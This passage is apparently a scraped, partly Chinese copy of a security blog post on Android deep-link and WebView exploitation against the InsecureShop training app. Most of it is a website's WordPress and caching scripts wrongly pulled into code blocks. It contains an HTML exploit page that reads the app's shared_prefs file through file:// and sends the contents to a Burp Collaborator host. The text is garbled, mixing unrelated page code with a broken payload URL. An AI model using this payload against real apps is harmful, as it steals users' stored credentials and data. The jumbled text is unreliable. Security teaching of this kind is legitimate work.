IntersectionObserverEntry.prototype}},{key:"isSlowConnection",value:function(){return"connection"in navigator&&"effectiveType"in navigator.connection&&("2g"===navigator.connection.effectiveType||"slow-2g"===navigator.connection.effectiveType)}}]),RocketBrowserCompatibilityChecker}();
</script><script id="rocket-preload-links-js-extra">
var RocketPreloadLinksConfig = {"excludeUris":"\/(?:.+\/)?feed(?:\/(?:.+\/?)?)?$|\/(?:.+\/)?embed\/|\/(index.php\/)?(.*)wp-json(\/.*|$)|\/refer\/|\/go\/|\/recommend\/|\/recommends\/","usesTrailingSlash":"1","imageExt":"jpg|jpeg|gif|png|tiff|bmp|webp|avif|pdf|doc|docx|xls|xlsx|php","fileExt":"jpg|jpeg|gif|png|tiff|bmp|webp|avif|pdf|doc|docx|xls|xlsx|php|html|htm","siteUrl":"https:\/\/8ksec.io","onHoverDelay":"100","rateThrottle":"3"};
</script><script type="rocketlazyloadscript" id="rocket-preload-links-js-after">
(function() {
"use strict";var r="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},e=function(){function i(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(e,t,n){return t&&i(e.prototype,t),n&&i(e,n),e}}();function i(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}var t=function(){function n(e,t){i(this,n),this.browser=e,this.config=t,this.options=this.browser.options,this.prefetched=new Set,this.eventTime=null,this.threshold=1111,this.numOnHover=0}return e(n,[{key:"init",value:function(){!this.browser.supportsLinkPrefetch()||this.browser.isDataSaverModeOn()||this.browser.isSlowConnection()||(this.regex={excludeUris:RegExp(this.config.excludeUris,"i"),images:RegExp(".("+this.config.imageExt+")$","i"),fileExt:RegExp(".("+this.config.fileExt+")$","i")},this._initListeners(this))}},{key:"_initListeners",value:function(e){-1<this.config.onHoverDelay&&document.addEventListener("mouseover",e.listener.bind(e),e.listenerOptions),document.addEventListener("mousedown",e.listener.bind(e),e.listenerOptions),document.addEventListener("touchstart",e.listener.bind(e),e.listenerOptions)}},{key:"listener",value:function(e){var t=e.target.closest("a"),n=this._prepareUrl(t);if(null!==n)switch(e.type){case"mousedown":case"touchstart":this._addPrefetchLink(n);break;case"mouseover":this._earlyPrefetch(t,n,"mouseout")}}},{key:"_earlyPrefetch",value:function(t,e,n){var i=this,r=setTimeout(function(){if(r=null,0===i.numOnHover)setTimeout(function(){return i.numOnHover=0},1e3);else if(i.numOnHover>i.config.rateThrottle)return;i.numOnHover++,i._addPrefetchLink(e)},this.config.onHoverDelay);t.addEventListener(n,function e(){t.removeEventListener(n,e,{passive:!0}),null!==r&&(clearTimeout(r),r=null)},{passive:!0})}},{key:"_addPrefetchLink",value:function(i){return this.prefetched.add(i.href),new Promise(function(e,t){var n=document.createElement("link");n.rel="prefetch",n.href=i.href,n.onload=e,n.onerror=t,document.head.appendChild(n)}).catch(function(){})}},{key:"_prepareUrl",value:function(e){if(null===e||"object"!==(void 0===e?"undefined":r(e))||!1 in e||-1===["http:","https:"].indexOf(e.protocol))return null;var t=e.href.substring(0,this.config.siteUrl.length),n=this._getPathname(e.href,t),i={original:e.href,protocol:e.protocol,origin:t,pathname:n,href:t+n};return this._isLinkOk(i)?i:null}},{key:"_getPathname",value:function(e,t){var n=t?e.substring(this.config.siteUrl.length):e;return n.startsWith("/")||(n="/"+n),this._shouldAddTrailingSlash(n)?n+"/":n}},{key:"_shouldAddTrailingSlash",value:function(e){return this.config.usesTrailingSlash&&!e.endsWith("/")&&!this.regex.fileExt.test(e)}},{key:"_isLinkOk",value:function(e){return null!==e&&"object"===(void 0===e?"undefined":r(e))&&(!this.prefetched.has(e.href)&&e.origin===this.config.siteUrl&&-1===e.href.indexOf("?")&&-1===e.href.indexOf("#")&&!this.regex.excludeUris.test(e.href)&&!this.regex.images.test(e.href))}}],[{key:"run",value:function(){"undefined"!=typeof RocketPreloadLinksConfig&&new n(new RocketBrowserCompatibilityChecker({capture:!0,passive:!0}),RocketPreloadLinksConfig).init()}}]),n}();t.run();
}());
</script><script id="rocket_lazyload_css-js-extra">
var rocket_lazyload_css_data = {"threshold":"300"};
</script><script id="rocket_lazyload_css-js-after">
!function o(n,c,s){function i(t,e){if(!c[t]){if(!n[t]){var r="function"==typeof require&&require;if(!e&&r)return r(t,!0);if(u)return u(t,!0);throw(r=new Error("Cannot find module '"+t+"'")).code="MODULE_NOT_FOUND",r}r=c[t]={exports:{}},n[t][0].call(r.exports,function(e){return i(n[t][1][e]||e)},r,r.exports,o,n,c,s)}return c[t].exports}for(var u="function"==typeof require&&require,e=0;e<s.length;e++)i(s[e]);return i}({1:[function(e,t,r){"use strict";!function(){const r="undefined"==typeof rocket_pairs?[]:rocket_pairs,o=document.querySelector("#wpr-lazyload-bg");var e=rocket_lazyload_css_data.threshold||300;const n=new IntersectionObserver(e=>{e.forEach(t=>{if(t.isIntersecting){const e=r.filter(e=>t.target.matches(e.selector));e.map(t=>{t&&(o.innerHTML+=t.style,t.elements.forEach(e=>{n.unobserve(e),e.setAttribute("data-rocket-lazy-bg-".concat(t.hash),"loaded")}))})}})},{rootMargin:e+"px"});function t(){0<(0<arguments.length&&void 0!==arguments[0]?arguments[0]:[]).length&&r.forEach(t=>{try{const e=document.querySelectorAll(t.selector);e.forEach(e=>{"loaded"!==e.getAttribute("data-rocket-lazy-bg-".concat(t.hash))&&(n.observe(e),(t.elements||(t.elements=[])).push(e))})}catch(e){console.error(e)}})}t();const c=function(){const o=window.MutationObserver;return function(e,t){if(e&&1===e.nodeType){const r=new o(t);return r.observe(e,{attributes:!0,childList:!0,subtree:!0}),r}}}();e=document.querySelector("body"),c(e,t)}()},{}]},{},[1]);
</script><script type="rocketlazyloadscript" data-rocket-type='text/javascript' data-rocket-src='https://8ksec.io/wp-content/themes/hello-elementor/assets/js/hello-frontend.min.js?m=1713216896' defer></script><script id="happy-elementor-addons-js-extra">
var HappyLocalize = {"ajax_url":"https:\/\/8ksec.io\/wp-admin\/admin-ajax.php","nonce":"7aaa6c49f8","pdf_js_lib":"https:\/\/8ksec.io\/wp-content\/plugins\/happy-elementor-addons\/assets\/vendor\/pdfjs\/lib"};
</script><script type="rocketlazyloadscript" data-rocket-src="https://8ksec.io/wp-content/plugins/happy-elementor-addons/assets/js/happy-addons.min.js?ver=3.10.8" id="happy-elementor-addons-js" defer></script><script data-minify="1" src="https://8ksec.io/wp-content/cache/min/1/wp-content/plugins/elementskit-lite/libs/framework/assets/js/frontend-script.js?ver=1715117488" id="elementskit-framework-js-frontend-js" defer></script><script id="elementskit-framework-js-frontend-js-after">
    var elementskit = {
      resturl: 'https://8ksec.io/wp-json/elementskit/v1/',
    }
</script><script type="rocketlazyloadscript" data-rocket-type='text/javascript' data-rocket-src='https://8ksec.io/_jb_static/??-eJyVj80OgkAMhN/Gk9BsDBIPxGeB3UoK++e2mw1vLxKNXDxwmzb9ZqYlVjp4QS8QbR7JM6BFt848k1SWBKGQGVEYyJNAz/zWE3/WFetEUbie+Fz+moW0B3GIvZ7rlL2Qw9qRP0A/0nZkKhdMtshHcEsDlH6Jgdb/fmpnQV7bbHBLmp4Z0wKZQIf0rXl3nWpVo66Xtrmd9NCpF14Tenc=' defer></script><script id="elementor-frontend-js-before">
var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Share on Facebook","shareOnTwitter":"Share on Twitter","pinIt":"Pin it","download":"Download","downloadImage":"Download image","fullscreen":"Fullscreen","zoom":"Zoom","share":"Share","playVideo":"Play Video","previous":"Previous","next":"Next","close":"Close","a11yCarouselWrapperAriaLabel":"Carousel | Horizontal scrolling: Arrow Left & Right","a11yCarouselPrevSlideMessage":"Previous slide","a11yCarouselNextSlideMessage":"Next slide","a11yCarouselFirstSlideMessage":"This is the first slide","a11yCarouselLastSlideMessage":"This is the last slide","a11yCarouselPaginationBulletMessage":"Go to slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile Portrait","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}}},"version":"3.21.5","is_static":false,"experimentalFeatures":{"e_optimized_assets_loading":true,"e_optimized_css_loading":true,"additional_custom_breakpoints":true,"container":true,"e_swiper_latest":true,"container_grid":true,"theme_builder_v2":true,"hello-theme-header-footer":true,"home_screen":true,"ai-layout":true,"landing-pages":true,"page-transitions":true,"notes":true,"form-submissions":true,"e_scroll_snap":true},"urls":{"assets":"https:\/\/8ksec.io\/wp-content\/plugins\/elementor\/assets\/"},"swiperClass":"swiper","settings":{"page":[],"editorPreferences":[]},"kit":{"body_background_background":"classic","active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description","hello_header_logo_type":"logo","hello_header_menu_layout":"horizontal","hello_footer_logo_type":"logo"},"post":{"id":7386,"title":"Android%20Deep%20Link%20issues%20and%20WebView%20Exploitation%20%7C%208kSec%20Blogs","excerpt":"","featuredImage":"https:\/\/i0.wp.com\/8ksec.io\/wp-content\/uploads\/2023\/04\/blog-deeplink.png?fit=800%2C800&ssl=1"}};
</script><script src="https://8ksec.io/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.21.5" id="elementor-frontend-js" defer></script><script type="rocketlazyloadscript" id="elementor-frontend-js-after">
var jkit_ajax_url = "https://8ksec.io/?jkit-ajax-request=jkit_elements", jkit_nonce = "57c32fba6a";
</script><script type="rocketlazyloadscript" data-minify="1" data-rocket-type='text/javascript' data-rocket-src='https://8ksec.io/wp-content/cache/min/1/wp-content/plugins/jeg-elementor-kit/assets/js/elements/sticky-element.js?ver=1715117488' defer></script><script type="text/plain" data-service="jetpack-statistics" data-category="statistics" data-cmplz-src="https://stats.wp.com/e-202419.js" id="jetpack-stats-js" data-wp-strategy="defer"></script><script id="jetpack-stats-js-after">
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"219667152\",\"post\":\"7386\",\"tz\":\"-4\",\"srv\":\"8ksec.io\",\"hp\":\"atomic\",\"ac\":\"2\",\"amp\":\"0\",\"j\":\"1:13.4\"}") ]);
_stq.push([ "clickTrackerInit", "219667152", "7386" ]);
</script><script id="cmplz-cookiebanner-js-extra">
var complianz = {"prefix":"cmplz_","user_banner_id":"1","set_cookies":[],"block_ajax_content":"","banner_version":"92","version":"7.0.5","store_consent":"","do_not_track_enabled":"1","consenttype":"optout","region":"us","geoip":"","dismiss_timeout":"","disable_cookiebanner":"","soft_cookiewall":"","dismiss_on_scroll":"","cookie_expiry":"365","url":"https:\/\/8ksec.io\/wp-json\/complianz\/v1\/","locale":"lang=en&locale=en_US","set_cookies_on_root":"","cookie_domain":"","current_policy_id":"11","cookie_path":"\/","categories":{"statistics":"statistics","marketing":"marketing"},"tcf_active":"","placeholdertext":"Click to accept {category} cookies and enable this content","css_file":"https:\/\/8ksec.io\/wp-content\/uploads\/complianz\/css\/banner-{banner_id}-{type}.css?v=92","page_links":{"us":{"cookie-statement":{"title":"Cookie Policy for 8kSec","url":"https:\/\/8ksec.io\/cookie-policy-for-8ksec\/"},"privacy-statement":{"title":"Privacy Policy","url":"https:\/\/8ksec.io\/privacy-policy\/"}}},"tm_categories":"","forceEnableStats":"","preview":"","clean_cookies":"","aria_label":"Click to accept {category} cookies and enable this content"};
</script><script defer src="https://8ksec.io/wp-content/plugins/complianz-gdpr/cookiebanner/js/complianz.min.js?ver=1714471607" id="cmplz-cookiebanner-js"></script><script type="rocketlazyloadscript" id="cmplz-cookiebanner-js-after">window.addEventListener('DOMContentLoaded', function() {
    if ('undefined' != typeof window.jQuery) {
      jQuery(document).ready(function ($) {
        $(document).on('elementor/popup/show', () => {
          let rev_cats = cmplz_categories.reverse();
          for (let key in rev_cats) {
            if (rev_cats.hasOwnProperty(key)) {
              let category = cmplz_categories[key];
              if (cmplz_has_consent(category)) {
                document.querySelectorAll('[data-category="' + category + '"]').forEach(obj => {
                  cmplz_remove_placeholder(obj);
                });
              }
            }
          }

          let services = cmplz_get_services_on_page();
          for (let key in services) {
            if (services.hasOwnProperty(key)) {
              let service = services[key].service;
              let category = services[key].category;
              if (cmplz_has_service_consent(service, category)) {
                document.querySelectorAll('[data-service="' + service + '"]').forEach(obj => {
                  cmplz_remove_placeholder(obj);
                });
              }
            }
          }
        });
      });
    }



      document.addEventListener("cmplz_enable_category", function(consentData) {
        var category = consentData.detail.category;
        var services = consentData.detail.services;
        var blockedContentContainers = [];
        let selectorVideo = '.cmplz-elementor-widget-video-playlist[data-category="'+category+'"],.elementor-widget-video[data-category="'+category+'"]';
        let selectorGeneric = '[data-cmplz-elementor-href][data-category="'+category+'"]';
        for (var skey in services) {
          if (services.hasOwnProperty(skey)) {
            let service = skey;
            selectorVideo +=',.cmplz-elementor-widget-video-playlist[data-service="'+service+'"],.elementor-widget-video[data-service="'+service+'"]';
            selectorGeneric +=',[data-cmplz-elementor-href][data-service="'+service+'"]';
          }
        }
        document.querySelectorAll(selectorVideo).forEach(obj => {
          let elementService = obj.getAttribute('data-service');
          if ( cmplz_is_service_denied(elementService) ) {
            return;
          }
          if (obj.classList.contains('cmplz-elementor-activated')) return;
          obj.classList.add('cmplz-elementor-activated');

          if ( obj.hasAttribute('data-cmplz_elementor_widget_type') ){
            let attr = obj.getAttribute('data-cmplz_elementor_widget_type');
            obj.classList.removeAttribute('data-cmplz_elementor_widget_type');
            obj.classList.setAttribute('data-widget_type', attr);
          }
          if (obj.classList.contains('cmplz-elementor-widget-video-playlist')) {
            obj.classList.remove('cmplz-elementor-widget-video-playlist');
            obj.classList.add('elementor-widget-video-playlist');
          }
          obj.setAttribute('data-settings', obj.getAttribute('data-cmplz-elementor-settings'));
          blockedContentContainers.push(obj);
        });

        document.querySelectorAll(selectorGeneric).forEach(obj => {
          let elementService = obj.getAttribute('data-service');
          if ( cmplz_is_service_denied(elementService) ) {
            return;
          }
          if (obj.classList.contains('cmplz-elementor-activated')) return;

          if (obj.classList.contains('cmplz-fb-video')) {
            obj.classList.remove('cmplz-fb-video');
            obj.classList.add('fb-video');
          }

          obj.classList.add('cmplz-elementor-activated');
          obj.setAttribute('data-href', obj.getAttribute('data-cmplz-elementor-href'));
          blockedContentContainers.push(obj.closest('.elementor-widget'));
        });

        /**
         * Trigger the widgets in Elementor
         */
        for (var key in blockedContentContainers) {
          if (blockedContentContainers.hasOwnProperty(key) && blockedContentContainers[key] !== undefined) {
            let blockedContentContainer = blockedContentContainers[key];
            if (elementorFrontend.elementsHandler) {
              elementorFrontend.elementsHandler.runReadyTrigger(blockedContentContainer)
            }
            var cssIndex = blockedContentContainer.getAttribute('data-placeholder_class_index');
            blockedContentContainer.classList.remove('cmplz-blocked-content-container');
            blockedContentContainer.classList.remove('cmplz-placeholder-' + cssIndex);
          }
        }

      });



            document.addEventListener("cmplz_enable_category", function () {
                document.querySelectorAll('[data-rocket-lazyload]').forEach(obj => {
                    if (obj.hasAttribute('data-lazy-src')) {
                        obj.setAttribute('src', obj.getAttribute('data-lazy-src'));
                    }
                });
            });



  let cmplzBlockedContent = document.querySelector('.cmplz-blocked-content-notice');
  if ( cmplzBlockedContent) {
          cmplzBlockedContent.addEventListener('click', function(event) {
            event.stopPropagation();
        });
  }
});</script><script type="rocketlazyloadscript" data-rocket-type='text/javascript' data-rocket-src='https://8ksec.io/wp-content/plugins/premium-addons-for-elementor/assets/frontend/min-js/premium-wrapper-link.min.js?m=1714256550' defer></script><script type="rocketlazyloadscript" data-rocket-src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/components/prism-core.min.js?ver=1.23.0" id="prismjs_core-js" defer></script><script type="rocketlazyloadscript" data-rocket-src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/plugins/autoloader/prism-autoloader.min.js?ver=1.23.0" id="prismjs_loader-js" defer></script><script type="rocketlazyloadscript" data-rocket-src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/plugins/normalize-whitespace/prism-normalize-whitespace.min.js?ver=1.23.0" id="prismjs_normalize-js" defer></script><script type="rocketlazyloadscript" data-rocket-src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/plugins/line-numbers/prism-line-numbers.min.js?ver=1.23.0" id="prismjs_line_numbers-js" defer></script><script type="rocketlazyloadscript" data-rocket-src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/plugins/toolbar/prism-toolbar.min.js?ver=1.23.0" id="prismjs_toolbar-js" defer></script><script type="rocketlazyloadscript" data-rocket-src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js?ver=1.23.0" id="prismjs_copy_to_clipboard-js" defer></script><script type="rocketlazyloadscript" data-rocket-type='text/javascript' data-rocket-src='https://8ksec.io/_jb_static/??-eJydkDkOwkAMRW9DReIEAakizjKLGZx4Fs1C4PZMEEUqhCi//Z+/7SU05BQXjQmmBGSFwcReaNStJddOab+ERnmX0WUIXAy5BMhoq/axCdGDSAnzG19QBqHmtdrG4jJZ3EzZBmlKGe7otI9QW8Hz80rM1YMx/8BENFitYt3hr6Qv15lSpcRoQBZiDTfv5/oap/HxoS527IfuPBwPp67bKTn2L4f7es0=' defer></script><script type="rocketlazyloadscript" data-rocket-src="https://8ksec.io/wp-content/plugins/gutenberg/build/i18n/index.min.js?ver=5baa98e4345eccc97e24" id="wp-i18n-js" defer></script><script type="rocketlazyloadscript" id="wp-i18n-js-after">
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
</script><script id="elementor-pro-frontend-js-before">
var ElementorProFrontendConfig = {"ajaxurl":"https:\/\/8ksec.io\/wp-admin\/admin-ajax.php","nonce":"a9bd38c197","urls":{"assets":"https:\/\/8ksec.io\/wp-content\/plugins\/elementor-pro\/assets\/","rest":"https:\/\/8ksec.io\/wp-json\/"},"shareButtonsNetworks":{"facebook":{"title":"Facebook","has_counter":true},"twitter":{"title":"Twitter"},"linkedin":{"title":"LinkedIn","has_counter":true},"pinterest":{"title":"Pinterest","has_counter":true},"reddit":{"title":"Reddit","has_counter":true},"vk":{"title":"VK","has_counter":true},"odnoklassniki":{"title":"OK","has_counter":true},"tumblr":{"title":"Tumblr"},"digg":{"title":"Digg"},"skype":{"title":"Skype"},"stumbleupon":{"title":"StumbleUpon","has_counter":true},"mix":{"title":"Mix"},"telegram":{"title":"Telegram"},"pocket":{"title":"Pocket","has_counter":true},"xing":{"title":"XING","has_counter":true},"whatsapp":{"title":"WhatsApp"},"email":{"title":"Email"},"print":{"title":"Print"}},"facebook_sdk":{"lang":"en_US","app_id":""},"lottie":{"defaultAnimationUrl":"https:\/\/8ksec.io\/wp-content\/plugins\/elementor-pro\/modules\/lottie\/assets\/animations\/default.json"}};
</script><script src="https://8ksec.io/wp-content/plugins/elementor-pro/assets/js/frontend.min.js?ver=3.7.7" id="elementor-pro-frontend-js" defer></script><script src="https://8ksec.io/wp-content/plugins/elementor-pro/assets/js/elements-handlers.min.js?ver=3.7.7" id="pro-elements-handlers-js" defer></script><script id="elementskit-elementor-js-extra">
var ekit_config = {"ajaxurl":"https:\/\/8ksec.io\/wp-admin\/admin-ajax.php","nonce":"66428ff64b"};
</script><script type="rocketlazyloadscript" data-rocket-type='text/javascript' data-rocket-src='https://8ksec.io/_jb_static/??-eJydjFEKgzAQBW/jV+MSKQY/pGeJ6SIvTVZxV3L9WugJ/JuBYdru0ibGYrSXc4UoceF6uX5grsCYGt4rmxIERlH1x1kpCmo0dglHKtxXSJ/10e4P/912XJ9XnX3wz2Gawui7tMz+C/G3Pzk=' defer></script><script type="text/plain"              data-category="statistics">window['gtag_enable_tcf_support'] = false;
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', '', {
  cookie_flags:'secure;samesite=none',

});
</script><script>window.lazyLoadOptions=[{elements_selector:"img[data-lazy-src],.rocket-lazyload,iframe[data-lazy-src]",data_src:"lazy-src",data_srcset:"lazy-srcset",data_sizes:"lazy-sizes",class_loading:"lazyloading",class_loaded:"lazyloaded",threshold:300,callback_loaded:function(element){if(element.tagName==="IFRAME"&&element.dataset.rocketLazyload=="fitvidscompatible"){if(element.classList.contains("lazyloaded")){if(typeof window.jQuery!="undefined"){if(jQuery.fn.fitVids){jQuery(element).parent().fitVids()}}}}}},{elements_selector:".rocket-lazyload",data_src:"lazy-src",data_srcset:"lazy-srcset",data_sizes:"lazy-sizes",class_loading:"lazyloading",class_loaded:"lazyloaded",threshold:300,}];window.addEventListener('LazyLoad::Initialized',function(e){var lazyLoadInstance=e.detail.instance;if(window.MutationObserver){var observer=new MutationObserver(function(mutations){var image_count=0;var iframe_count=0;var rocketlazy_count=0;mutations.forEach(function(mutation){for(var i=0;i<mutation.addedNodes.length;i++){if(typeof mutation.addedNodes[i].getElementsByTagName!=='function'){continue}
if(typeof mutation.addedNodes[i].getElementsByClassName!=='function'){continue}
images=mutation.addedNodes[i].getElementsByTagName('img');is_image=mutation.addedNodes[i].tagName=="IMG";iframes=mutation.addedNodes[i].getElementsByTagName('iframe');is_iframe=mutation.addedNodes[i].tagName=="IFRAME";rocket_lazy=mutation.addedNodes[i].getElementsByClassName('rocket-lazyload');image_count+=images.length;iframe_count+=iframes.length;rocketlazy_count+=rocket_lazy.length;if(is_image){image_count+=1}
if(is_iframe){iframe_count+=1}}});if(image_count>0||iframe_count>0||rocketlazy_count>0){lazyLoadInstance.update()}});var b=document.getElementsByTagName("body")[0];var config={childList:!0,subtree:!0};observer.observe(b,config)}},!1)</script><script data-no-minify="1" async src="https://8ksec.io/wp-content/plugins/wp-rocket/assets/js/lazyload/17.8.3/lazyload.min.js"></script><script>function lazyLoadThumb(e,alt){var t='<img loading="lazy" data-lazy-src="https://i.ytimg.com/vi/ID/hqdefault.jpg" alt="" width="480" height="360"><noscript><img loading="lazy" src="https://i.ytimg.com/vi/ID/hqdefault.jpg" alt="" width="480" height="360"></noscript>',a='<button class="play" aria-label="play Youtube video"></button>';t=t.replace('alt=""','alt="'+alt+'"');return t.replace("ID",e)+a}function lazyLoadYoutubeIframe(){var e=document.createElement("iframe"),t="ID?autoplay=1";t+=0===this.parentNode.dataset.query.length?'':'&'+this.parentNode.dataset.query;e.setAttribute("src",t.replace("ID",this.parentNode.dataset.src)),e.setAttribute("frameborder","0"),e.setAttribute("allowfullscreen","1"),e.setAttribute("allow", "accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"),this.parentNode.parentNode.replaceChild(e,this.parentNode)}document.addEventListener("DOMContentLoaded",function(){var e,t,p,a=document.getElementsByClassName("rll-youtube-player");for(t=0;t<a.length;t++)e=document.createElement("div"),e.setAttribute("data-id",a[t].dataset.id),e.setAttribute("data-query", a[t].dataset.query),e.setAttribute("data-src", a[t].dataset.src),e.innerHTML=lazyLoadThumb(a[t].dataset.id,a[t].dataset.alt),a[t].appendChild(e),p=e.querySelector('.play'),p.onclick=lazyLoadYoutubeIframe});</script></body>
  </html>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafCAzIfQDXl0xbqot42Df11Zyrv812vrtZN8YfF0zzES0IaUFrXt7Lknicz4dpV7H2wt82xtibWNPjw/640?wx_fmt=png&from=appmsg "")  
  
  
单击时将显示受害者的登录详细信息。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafCAzIfQDXl0xbqot42Df11F8NSZZpDtG7Czfzb5MshRJicyGqdFPJJaMDibUSAhTwOCjke7icDfDz2A/640?wx_fmt=png&from=appmsg "")  
  
  
我们还可以托管一个带有恶意 html 的网页，如下所示  
```
<html>
    <head><style id="wpr-lazyload-bg"></style><style id="wpr-lazyload-bg-exclusion"></style>
<noscript>
<style id="wpr-lazyload-bg-nostyle">:root{--wpr-bg-4e19fb5d-5eeb-41f6-8a91-aafbad3346f1: url('https://8ksec.io/wp-content/plugins/wp-rocket/assets/img/youtube.png');}:root{--wpr-bg-56049537-b1e7-4386-957e-f55c7494936b: url('https://8ksec.io/wp-content/plugins/wp-rocket/assets/img/youtube.png');}</style>
</noscript>
</head>
    <body>
      < script type="text/javascript">
        function exfiltrateFile(filePath, callback) {
          var request = new XMLHttpRequest();
          request.open("GET", "file://" + filePath, true);
          request.onload = function(event) {
            callback(btoa(request.responseText));
          }
          request.onerror = function(event) {
            document.write(event);
            callback(null);
          }
          request.send();
        }
        var filePath = "/data/user/0/com.insecureshop/shared_prefs/Prefs.xml";
        exfiltrateFile(filePath, function(contents) {
              document.write(contents);
              var exfil = new XMLHttpRequest();
              exfil.open("GET", " < https: //burpcolloboratorurl.com?file=>" + contents, true);
                exfil.onload = function(event) {
                  document.write(" < /br>[+] File successfully exfiltrated to remote server");
                  }
                  exfil.onerror = function(event) {
                    document.write(event);
                    callback(null);
                  }
                  exfil.send();
                });
      </script>
    <script>if(navigator.userAgent.match(/MSIE|Internet Explorer/i)||navigator.userAgent.match(/Trident\/7\..*?rv:11/i)){var href=document.location.href;if(!href.match(/[?&]nowprocket/)){if(href.indexOf("?")==-1){if(href.indexOf("#")==-1){document.location.href=href+"?nowprocket=1"}else{document.location.href=href.replace("#","?nowprocket=1#")}}else{if(href.indexOf("#")==-1){document.location.href=href+"&nowprocket=1"}else{document.location.href=href.replace("#","&nowprocket=1#")}}}}</script><script>class RocketLazyLoadScripts{constructor(){this.v="1.2.3",this.triggerEvents=["keydown","mousedown","mousemove","touchmove","touchstart","touchend","wheel"],this.userEventHandler=this._triggerListener.bind(this),this.touchStartHandler=this._onTouchStart.bind(this),this.touchMoveHandler=this._onTouchMove.bind(this),this.touchEndHandler=this._onTouchEnd.bind(this),this.clickHandler=this._onClick.bind(this),this.interceptedClicks=[],window.addEventListener("pageshow",t=>{this.persisted=t.persisted}),window.addEventListener("DOMContentLoaded",()=>{this._preconnect3rdParties()}),this.delayedScripts={normal:[],async:[],defer:[]},this.trash=[],this.allJQueries=[]}_addUserInteractionListener(t){if(document.hidden){t._triggerListener();return}this.triggerEvents.forEach(e=>window.addEventListener(e,t.userEventHandler,{passive:!0})),window.addEventListener("touchstart",t.touchStartHandler,{passive:!0}),window.addEventListener("mousedown",t.touchStartHandler),document.addEventListener("visibilitychange",t.userEventHandler)}_removeUserInteractionListener(){this.triggerEvents.forEach(t=>window.removeEventListener(t,this.userEventHandler,{passive:!0})),document.removeEventListener("visibilitychange",this.userEventHandler)}_onTouchStart(t){"HTML"!==t.target.tagName&&(window.addEventListener("touchend",this.touchEndHandler),window.addEventListener("mouseup",this.touchEndHandler),window.addEventListener("touchmove",this.touchMoveHandler,{passive:!0}),window.addEventListener("mousemove",this.touchMoveHandler),t.target.addEventListener("click",this.clickHandler),this._renameDOMAttribute(t.target,"onclick","rocket-onclick"),this._pendingClickStarted())}_onTouchMove(t){window.removeEventListener("touchend",this.touchEndHandler),window.removeEventListener("mouseup",this.touchEndHandler),window.removeEventListener("touchmove",this.touchMoveHandler,{passive:!0}),window.removeEventListener("mousemove",this.touchMoveHandler),t.target.removeEventListener("click",this.clickHandler),this._renameDOMAttribute(t.target,"rocket-onclick","onclick"),this._pendingClickFinished()}_onTouchEnd(t){window.removeEventListener("touchend",this.touchEndHandler),window.removeEventListener("mouseup",this.touchEndHandler),window.removeEventListener("touchmove",this.touchMoveHandler,{passive:!0}),window.removeEventListener("mousemove",this.touchMoveHandler)}_onClick(t){t.target.removeEventListener("click",this.clickHandler),this._renameDOMAttribute(t.target,"rocket-onclick","onclick"),this.interceptedClicks.push(t),t.preventDefault(),t.stopPropagation(),t.stopImmediatePropagation(),this._pendingClickFinished()}_replayClicks(){window.removeEventListener("touchstart",this.touchStartHandler,{passive:!0}),window.removeEventListener("mousedown",this.touchStartHandler),this.interceptedClicks.forEach(t=>{t.target.dispatchEvent(new MouseEvent("click",{view:t.view,bubbles:!0,cancelable:!0}))})}_waitForPendingClicks(){return new Promise(t=>{this._isClickPending?this._pendingClickFinished=t:t()})}_pendingClickStarted(){this._isClickPending=!0}_pendingClickFinished(){this._isClickPending=!1}_renameDOMAttribute(t,e,r){t.hasAttribute&&t.hasAttribute(e)&&(event.target.setAttribute(r,event.target.getAttribute(e)),event.target.removeAttribute(e))}_triggerListener(){this._removeUserInteractionListener(this),"loading"===document.readyState?document.addEventListener("DOMContentLoaded",this._loadEverythingNow.bind(this)):this._loadEverythingNow()}_preconnect3rdParties(){let t=[];document.querySelectorAll("script[type=rocketlazyloadscript]").forEach(e=>{if(e.hasAttribute("src")){let r=new URL(e.src).origin;r!==location.origin&&t.push({src:r,crossOrigin:e.crossOrigin||"module"===e.getAttribute("data-rocket-type")})}}),t=[...new Map(t.map(t=>[JSON.stringify(t),t])).values()],this._batchInjectResourceHints(t,"preconnect")}async 